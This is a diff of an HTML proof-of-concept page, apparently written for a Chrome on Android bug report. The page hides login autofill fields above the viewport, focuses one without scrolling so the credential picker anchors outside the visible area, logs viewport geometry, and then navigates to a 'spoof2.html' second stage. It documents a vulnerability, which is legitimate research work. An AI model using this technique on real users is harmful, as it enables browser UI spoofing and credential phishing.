@@ -4,33 +4,33 @@
   <meta name="viewport"
         content="width=device-width, initial-scale=1.0, user-scalable=no">
 
-  <title>Chrome Bottom Address-Bar UI Overlap PoC</title>
+  <title>Chrome Bottom Address-Bar Overlap PoC</title>
 
   <style>
     html,
     body {
       margin: 0;
       padding: 0;
+      width: 100%;
       height: 100%;
       overflow: hidden;
     }
 
     /*
-     * The autofill target field is positioned ABOVE the viewport.
+     * The autofill target is deliberately positioned above
+     * the WebView viewport.
      *
-     * element.BoundsInWidget() can return a negative y coordinate,
-     * which is propagated to the autofill pipeline. The Android
-     * credential picker (FillUi) can then calculate an anchor outside
-     * the WebView's visible bounds.
-     *
-     * Adjust "top" to target a specific browser/embedder UI region.
+     * This causes the renderer-side bounds for the field to
+     * contain a negative Y coordinate.
      */
     #u {
       position: fixed;
       top: -120px;
       left: 0;
+
       width: 300px;
       height: 40px;
+
       font-size: 16px;
     }
 
@@ -38,8 +38,11 @@
       position: fixed;
       top: -200px;
       left: 0;
+
       width: 300px;
       height: 40px;
+
+      font-size: 16px;
     }
 
     /*
@@ -47,124 +50,246 @@
      */
     #tap {
       position: fixed;
+
       top: 40px;
       left: 20px;
       right: 20px;
-      padding: 18px;
+
+      height: 56px;
+      line-height: 56px;
+
       background: #1a73e8;
-      color: #fff;
+      color: white;
+
       font: 18px sans-serif;
+      line-height: 56px;
       text-align: center;
+
       border-radius: 6px;
-      box-sizing: border-box;
+
       user-select: none;
       -webkit-user-select: none;
+
+      touch-action: manipulation;
+
+      box-sizing: border-box;
+    }
+
+    #status {
+      position: fixed;
+
+      top: 115px;
+      left: 20px;
+      right: 20px;
+
+      font: 14px sans-serif;
+      line-height: 20px;
     }
 
     #log {
       position: fixed;
-      top: 120px;
+
+      top: 180px;
       left: 20px;
       right: 20px;
+
       font: 12px monospace;
+      line-height: 18px;
+
       white-space: pre-wrap;
+      overflow-wrap: break-word;
     }
   </style>
 </head>
 
 <body>
 
-  <form action="c/login" method="post" id="f">
-    <input
-      id="u"
-      name="username"
-      type="text"
-      autocomplete="username">
+<form action="c/login" method="post" id="f">
 
-    <input
-      id="p"
-      name="password"
-      type="password"
-      autocomplete="current-password">
-  </form>
+  <!-- Deliberately outside the visible viewport. -->
+  <input
+    id="u"
+    name="username"
+    type="text"
+    autocomplete="username">
 
-  <!--
-    Single-tap reproduction trigger.
-  -->
-  <div id="tap">Tap once to reproduce</div>
+  <input
+    id="p"
+    name="password"
+    type="password"
+    autocomplete="current-password">
 
-  <pre id="log"></pre>
+</form>
 
-  <script>
-    const log = message => {
-      document.getElementById('log').textContent += message + '\n';
-    };
+<!--
+  Only one user interaction is required.
+-->
+<div id="tap">Tap once to reproduce</div>
 
-    const tap = document.getElementById('tap');
-    const username = document.getElementById('u');
+<div id="status">
+  Ready
+</div>
 
-    let triggered = false;
+<pre id="log"></pre>
 
-    tap.addEventListener('click', () => {
-      if (triggered) {
-        return;
-      }
+<script>
+'use strict';
 
-      triggered = true;
+const tap = document.getElementById('tap');
+const username = document.getElementById('u');
+const status = document.getElementById('status');
+const logElement = document.getElementById('log');
 
-      log('Starting reproduction...');
+let started = false;
 
-      /*
-       * Focus the off-viewport autofill field without scrolling it
-       * into the visible viewport.
-       *
-       * The renderer can send autofill.mojom.AutofillDriver
-       * information containing a FormFieldData bounds.y < 0,
-       * originating from element.BoundsInWidget().
-       */
-      username.focus({ preventScroll: true });
+function log(message) {
+  logElement.textContent += message + '\n';
+}
 
-      const rect = username.getBoundingClientRect();
+function reportViewport() {
+  const rect = username.getBoundingClientRect();
 
-      log(
-        'focused #u, viewport bounds y=' +
-        rect.top +
-        ' h=' +
-        rect.height
-      );
+  log(
+    'field rect: ' +
+    'x=' + rect.x +
+    ' y=' + rect.y +
+    ' w=' + rect.width +
+    ' h=' + rect.height
+  );
 
-      log(
-        'expected: autofill UI is anchored relative to an ' +
-        'off-viewport field'
-      );
+  log(
+    'window.innerHeight=' +
+    window.innerHeight
+  );
 
-      log('Waiting for browser UI to settle...');
+  if (window.visualViewport) {
+    log(
+      'visualViewport: ' +
+      'height=' + window.visualViewport.height +
+      ' offsetTop=' + window.visualViewport.offsetTop +
+      ' scale=' + window.visualViewport.scale
+    );
+  }
+}
 
-      /*
-       * Preserve the delay from the original PoC.
-       *
-       * This gives Chrome time to update/reposition its browser UI
-       * before navigating to the next page.
-       */
-      setTimeout(() => {
-        log('Navigating to spoof2.html...');
+tap.addEventListener('click', () => {
+  if (started)
+    return;
 
-        document.location = 'spoof2.html';
-      }, 6000);
-    });
+  started = true;
 
-    /*
-     * Variant:
-     *
-     * To test an element positioned BELOW the WebView instead,
-     * uncomment the following line.
-     *
-     * This can be used to investigate overlap with a bottom
-     * embedder/browser UI region.
-     *
-     * username.style.top = (window.innerHeight + 80) + 'px';
-     */
-  </script>
+  tap.textContent = 'Reproduction running...';
+  status.textContent = 'Triggering autofill...';
+
+  log('=== START ===');
+  log('Single user gesture received');
+
+  /*
+   * The important trigger:
+   *
+   * Focus an autofill field that is positioned above the
+   * visible WebView viewport without allowing the browser
+   * to scroll it into view.
+   */
+  username.focus({
+    preventScroll: true
+  });
+
+  log('Focused off-viewport username field');
+
+  reportViewport();
+
+  /*
+   * Give Chrome/Android time to present the keyboard and
+   * autofill UI and to perform its viewport/layout updates.
+   */
+  setTimeout(() => {
+    status.textContent = 'Waiting for browser UI to settle...';
+
+    log('');
+    log('--- after 750 ms ---');
+
+    reportViewport();
+
+  }, 750);
+
+  /*
+   * Re-check after the keyboard/autofill UI has had time
+   * to settle.
+   *
+   * This is intentionally NOT another user interaction.
+   */
+  setTimeout(() => {
+    status.textContent = 'Autofill/browser UI state established';
+
+    log('');
+    log('--- after 2000 ms ---');
+
+    reportViewport();
+
+  }, 2000);
+
+  /*
+   * Preserve the delay used by the original PoC before
+   * transitioning to the second page.
+   */
+  setTimeout(() => {
+    status.textContent = 'Loading second-stage page...';
+
+    log('');
+    log('--- after 6000 ms ---');
+    log('Navigating to spoof2.html');
+
+    window.location.href = 'spoof2.html';
+
+  }, 6000);
+});
+
+
+/*
+ * Useful diagnostics while the keyboard changes the
+ * visual viewport.
+ */
+if (window.visualViewport) {
+
+  window.visualViewport.addEventListener('resize', () => {
+    log('');
+    log('[visualViewport resize]');
+
+    reportViewport();
+  });
+
+  window.visualViewport.addEventListener('scroll', () => {
+    log('');
+    log('[visualViewport scroll]');
+
+    reportViewport();
+  });
+}
+
+
+/*
+ * Log regular window resize events as well.
+ */
+window.addEventListener('resize', () => {
+  log('');
+  log('[window resize]');
+
+  reportViewport();
+});
+
+
+/*
+ * Variant:
+ *
+ * To investigate the opposite direction (content positioned
+ * below the WebView and overlapping bottom embedder UI),
+ * uncomment:
+ *
+ * username.style.top = (window.innerHeight + 80) + 'px';
+ */
+
+</script>
 
 </body>
 </html>
